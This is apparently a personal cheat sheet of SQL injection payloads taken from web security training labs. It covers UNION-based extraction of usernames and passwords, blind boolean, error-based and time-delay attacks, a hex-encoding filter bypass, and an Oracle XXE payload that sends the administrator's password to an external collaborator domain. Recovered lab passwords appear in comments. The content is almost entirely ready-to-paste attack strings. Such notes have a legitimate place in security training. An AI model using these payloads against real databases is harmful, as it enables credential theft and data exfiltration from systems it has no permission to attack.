```sql
-- When copying, don't copy first quote, the quote is only there to help with highlighting

-- Number of columns:
' ' UNION SELECT null FROM products--
' ' UNION SELECT NULL, NULL, NULL--

-- Finding text column:
' ' UNION SELECT 't9eYhp', NULL, NULL--
' ' UNION SELECT NULL, 't9eYhp', NULL--
' ' UNION SELECT NULL, NULL, 't9eYhp'--

-- Getting table data:
' ' UNION SELECT username, password FROM users--

-- Multiple values in a single column:
' ' UNION SELECT NULL, username || '>>' || password FROM users-- 

-- Get Oracle version: 
' ' UNION SELECT 'abc', 'abc' FROM dual--
' ' UNION SELECT BANNER, NULL FROM v$version--

-- Get MySQL/Microsoft version:
' ' UNION SELECT @@version, NULL# 

-- Getting contents non-oracle:
' ' UNION SELECT NULL, NULL FROM information_schema.tables-- 
' ' UNION SELECT 'ABC', 'abc' FROM information_schema.tables-- 
' ' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables--
' ' UNION SELECT NULL, COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_hsffca'--
' ' UNION SELECT username_ipvnfc, password_oudxci FROM users_hsffca--

-- Getting contents:
' ' UNION SELECT NULL, NULL FROM all_tables--
' ' UNION SELECT 'ABC', 'abc' FROM all_tables--
' ' UNION SELECT NULL, TABLE_NAME FROM all_tables--
' ' UNION SELECT NULL, COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_BNELEF'--
' ' UNION SELECT USERNAME_NQYXER, PASSWORD_QMXBMW FROM USERS_BNELEF--

-- Blind with conditional responses:
' ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a --true

' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'l --true
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 't -- false
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'p -- true
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'r -- false
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'q -- true

' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) > 'l -- true
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) > 't -- false
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) > 'p -- true
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) > 'r -- false
' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'q -- true

' ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'q

-- curpass = qqnhmsq20tm757405vzx

-- Blind with Conditional Errors:
' '||(SELECT CASE WHEN LENGTH(password)=15 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
' '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
x'||(SELECT+CASE+WHEN+LENGTH(password)%3d20+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'


-- Use these as a template
-- The default attack can find length
-- A cluster bomb with 1st payload as numbers 1 to len and 2nd payload as [a-zA-Z0-9]

-- length = 20
-- curpass = jmnu6fietsh0ady6ybtv

-- Visible error based:
' ' CAST((SELECT username, password FROM users) AS int)
' ' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- This gets the password and limits the output to one row
-- The 1= was because it required a boolen expression
-- To find the vulnerability a ' was added and then '-- the first had an error the second did not

-- Blind with time delays and information:
' '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
' '%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
' '%3BSELECT+CASE+WHEN+(username='administrator' and LENGTH(password)=§1§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
' '%3BSELECT+CASE+WHEN+(username='administrator' and SUBSTR(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

-- Use these as a template
-- The default attack can find length
-- A cluster bomb with 1st payload as numbers 1 to len and 2nd payload as [a-zA-Z0-9]

-- Length = 20
-- curpass = w4orowvfxks9gfkxpsgz

-- Blind SQL with Out of Band interaction
-- Collaborator server: p9z238fjlxzu1jnzeoxb3hc43v9mxcl1.oastify.com

' '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//p9z238fjlxzu1jnzeoxb3hc43v9mxcl1.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

-- Blind SQL Out of Band data exfil
-- Collaborator server: p9z238fjlxzu1jnzeoxb3hc43v9mxcl1.oastify.com

' '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select password from users where username='administrator')||'.p9z238fjlxzu1jnzeoxb3hc43v9mxcl1.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
```
-- SQL injection filter bypass via XML
-- checked if 1 + 1 worked in store id

<@hex_entities>1 <@/hex_entities>
<@hex_entities>1 UNION SELECT NULL <@/hex_entities>
<@hex_entities>1 UNION SELECT username || '-->' || password FROM users <@/hex_entities>
```

